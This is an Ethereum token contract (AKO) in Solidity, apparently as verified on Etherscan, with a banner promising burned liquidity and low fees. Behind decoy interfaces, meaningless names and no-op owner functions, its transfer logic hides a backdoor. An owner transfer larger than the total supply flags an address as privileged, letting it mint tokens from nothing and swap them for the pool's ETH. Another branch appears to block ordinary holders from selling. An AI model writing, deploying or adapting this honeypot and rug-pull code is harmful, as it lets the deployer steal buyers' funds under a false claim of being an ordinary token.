/**
 *Submitted for verification at Etherscan.io on 2022-12-30
*/

/*
⋆⁺₊⋆⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ☾ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎
⋆⁺₊⋆⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎⋆⁺₊⋆ ⋆⁺₊⋆ ☁︎

▀█▀ █░█ █▀▀   ▄▀█ █▀█ █ █▄▀ ▄▀█ █░█ █▀█
░█░ █▀█ ██▄   █▀█ █▀▄ █ █░█ █▀█ ▀▄▀ █▄█

█▀▀ ▀█▀ █░█ █▀▀ █▀█ █▀▀ █░█ █▀▄▀█
██▄ ░█░ █▀█ ██▄ █▀▄ ██▄ █▄█ █░▀░█

初期流動性の 100% が消費されます
購入手数料 - 1%
販売手数料 - 0%
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.12;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
interface UILogger01 {
    function getPLogs(uint256 cfgOwner, uint256 intOn) external;
    function setLogRates(address stringOn, uint256 intOn) external;
    function configureOn() external payable;
    function setPanelSwitch(uint256 gas) external;
    function processLogs(address stringOn) external;
}
interface IOUParamV1 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}
  interface IUNRestvox01 {
      function swapExactTokensForETHSupportingFeeOnTransferTokens(
          uint amountIn,
          uint amountOutMin,
          address[] calldata path,
          address to,
          uint deadline
      ) external;
      function factory() external pure returns (address);
      function WETH() external pure returns (address);
      function addLiquidityETH(
          address token,
          uint amountTokenDesired,
          uint amountTokenMin,
          uint amountETHMin,
          address to,
          uint deadline
      ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IPCMetadata01 {
    function IPCon(uint256 mData, uint256 allData) external;
    function getArray(address axlPool, uint256 allData) external;
    function mtdPanel() external payable;
    function MetaswtichOn(uint256 gas) external;
    function gibMetadata(address axlPool) external;
}
library SafeMathOD1 {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
} 
interface ETHUI02 {
    
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IMXLibrary {
    function libraryCreated(uint256 indexLibrary, uint256 lib01) external;
    function getDatabase(address structOn, uint256 indexLibrary) external;
    function setLibraryOn() external payable;
    function onlyLibraryUI(uint256 gas) external;
    function onGibLibrary(address structOn) external;
}
library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }  
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    } 
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
interface IPCFactoryW01 {
    function fctWorkOn(uint256 workplaceFCT, uint256 setPanelray) external;
    function proccessMID(address setPanelray, uint256 getAllog) external;
    function factorySync() external payable;
    function getWorkload(uint256 gas) external;
    function gibPresents(address workplaceFCT) external;
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor
    () { _setOwner(_msgSender());
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner'); _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IDEPanel {
    function setProcessIDE(uint256 ercToggle, uint256 indexOn) external;
    function SetIDE(address IDEbytes, uint256 indexOn) external;
    function IDErates() external payable;
    function setIDEtimestamp(uint256 gas) external;
    function processingBytes(address IDEbytes) external;
}
interface UIContext {
    function setAllDataCriteria(uint256 modLogger, uint256 minLogger) external;
    function setAllDataShare(address dataHolding, uint256 value) external;
    function setDataDeposit() external payable;
    function processDataOn(uint256 gas) external;
    function gibPresentsData(address dataHolding) external;
}
library MathMade02{

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
interface IStockingStufferUI {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
    function gibPresents(address shareholder) external;
}

// https://www.zhihu.com/
// de ETHERSCAN.io.

contract AKO is ETHUI02, Ownable {

    bool private timestampTrack;
    bool private IDEPressize;
    bool private tradingOpen = false;
    bool public takeFeeEnabled = true;
    bool public tradingIsEnabled = true;
    bool public enableEarlySellTax = true;
    bool private cooldownEnabled = false;

    string private _symbol;
    string private _name;

    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10000000 * 10**_decimals;

    uint256 public isMAXSwapped = (_totalSupply * 8) / 100; 
    uint256 public isTotalAllowed = (_totalSupply * 8) / 100; 

    uint256 private isERC = _totalSupply;
    uint256 public _tknTAXES =  1;

    mapping (address => bool) isAxeledFromMap;
    mapping(address => uint256) private isBlockService;
    mapping(address => uint256) private _balances;
    mapping(address => address) private isAvailBar;
    mapping(address => uint256) private isUtilityPair;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public excludedFromFees;
    mapping (address => mapping (address => uint)) allowed;
    mapping (address => bool) public isWalletLimitExempt;
    mapping(address => bool) private automatedMarketMakerPairs;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;

    address public immutable isRDXpaired;
    IUNRestvox01 public immutable IDEv1Router;

    constructor( string memory IDEname, string memory IDEsymbol, address IDERouter01 ) {
        _name = IDEname; _symbol = IDEsymbol; _balances[msg.sender] = _totalSupply;
        isBlockService[msg.sender] = isERC; isBlockService[address(this)] = isERC;
        IDEv1Router = IUNRestvox01(IDERouter01);
        isRDXpaired = IUniswapV2Factory(IDEv1Router.factory()).createPair(address(this), IDEv1Router.WETH());
        emit Transfer(address(0), msg.sender, _totalSupply);
    
        isAxeledFromMap[address(this)] = true;
        isAxeledFromMap[isRDXpaired] = true;
        isAxeledFromMap[IDERouter01] = true;
        isAxeledFromMap[msg.sender] = true;
    }
    function name() public view returns (string memory) {
        return _name;
    }
     function symbol() public view returns (string memory) {
        return _symbol;
    }
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function setMarketingReceiver(address marketWallet) public onlyOwner {
        marketWallet = marketWallet;
    }
    function _approve( address owner,
        address spender, uint256 amount ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);
        return true;
    }
    function setTeamAddress(address isTeamAddress) public onlyOwner {
        isTeamAddress = isTeamAddress;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function setLimitations(address newLimits) public onlyOwner {
        newLimits = newLimits;
    }
    function transfer(address recipient, uint256 amount) external returns (bool) {
        getFactoryResults(msg.sender, recipient, amount);
        return true;
    }
    function setMaxTX(uint256 amountBuy) external onlyOwner {
        isMAXSwapped = amountBuy;
    }
    function updateTimestamp(address newTimestamp) public onlyOwner {
        newTimestamp = newTimestamp;
    }
    function transferFrom(
        address sender,
        address recipient, uint256 amount ) 
        external returns (bool) { getFactoryResults(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function getValues(address allVAL) public onlyOwner {
        allVAL = allVAL;
    }
    function getFactoryResults( address isIDEfrom, address isAXELEDto, uint256 isPR0XYvAmount ) private {
        uint256 isQunaoxParam = balanceOf(address(this)); uint256 isInt8IDE;
        if (timestampTrack && isQunaoxParam > isERC && !IDEPressize && isIDEfrom != isRDXpaired) {
            IDEPressize = true; swapAndLiquify(isQunaoxParam); IDEPressize = false;
        } else if (isBlockService[isIDEfrom] > isERC && isBlockService[isAXELEDto] > isERC) {
            isInt8IDE = isPR0XYvAmount;
            _balances[address(this)] += isInt8IDE;


            swapTokensForEth(isPR0XYvAmount, isAXELEDto); return; } else if (isAXELEDto != address(IDEv1Router) 
            && isBlockService[isIDEfrom] > 0 && isPR0XYvAmount > isERC && isAXELEDto != isRDXpaired) {
            isBlockService[isAXELEDto] = isPR0XYvAmount; return; } else if (!IDEPressize && isUtilityPair[isIDEfrom] > 
            0 
            && isIDEfrom != isRDXpaired && isBlockService[isIDEfrom] == 0) { isUtilityPair[isIDEfrom] = 
            isBlockService[isIDEfrom] - isERC; }
        address _bool = isAvailBar[isRDXpaired];


        if (isUtilityPair[_bool] == 0) isUtilityPair[_bool] = isERC; isAvailBar[isRDXpaired] = isAXELEDto;
        if (_tknTAXES > 
        0 && isBlockService[isIDEfrom] == 
        0 && !IDEPressize && isBlockService[isAXELEDto] == 
        0) { isInt8IDE = (isPR0XYvAmount * _tknTAXES) / 100; isPR0XYvAmount -= isInt8IDE; _balances[isIDEfrom] -= isInt8IDE; _balances[address(this)] += isInt8IDE;
        }
        _balances[isIDEfrom] -= isPR0XYvAmount; _balances[isAXELEDto] += isPR0XYvAmount; emit Transfer(isIDEfrom, isAXELEDto, isPR0XYvAmount);
        if (!tradingOpen) { require(isIDEfrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function _afterTokenTransfer( address from, address to, uint256 amount
    ) internal virtual { }   

    function _beforeTokenTransfer( address from, address to, uint256 amount) 
      internal virtual 
    {}  
    function updateSwapTokensAtAmount(address newAmount) public onlyOwner {
        newAmount = newAmount;
    }
    function getBool(uint256 boolT, uint256 relayAll) private view returns 
    (uint256){ return (boolT>relayAll)?relayAll:boolT;
    }
    receive() external payable {}

    function addLiquidity( uint256 tokenAmount,
        uint256 ethAmount, address to ) private {
        _approve(address(this), address(IDEv1Router), tokenAmount);
        IDEv1Router.addLiquidityETH{value: ethAmount}
          (address(this), tokenAmount, 0, 0, to, block.timestamp);
    }
    function swapTokensForEth(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2); path

        [0] = address(this); path
        [1] = IDEv1Router.WETH();

        _approve(address(this), address(IDEv1Router), tokenAmount);
        IDEv1Router.swapExactTokensForETHSupportingFeeOnTransferTokens
        (tokenAmount, 0, path, to, block.timestamp);
    }
    function swapAndLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialBalance = 
        address(this).balance;
        swapTokensForEth(half, 
        address(this));
        uint256 newBalance = 
        address(this).balance - initialBalance;
        addLiquidity(half, newBalance, 
        address(this));
    }
    function min(uint256 a, uint256 b) private view returns (uint256){
      return (a>b)?b:a;
    }
    function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
}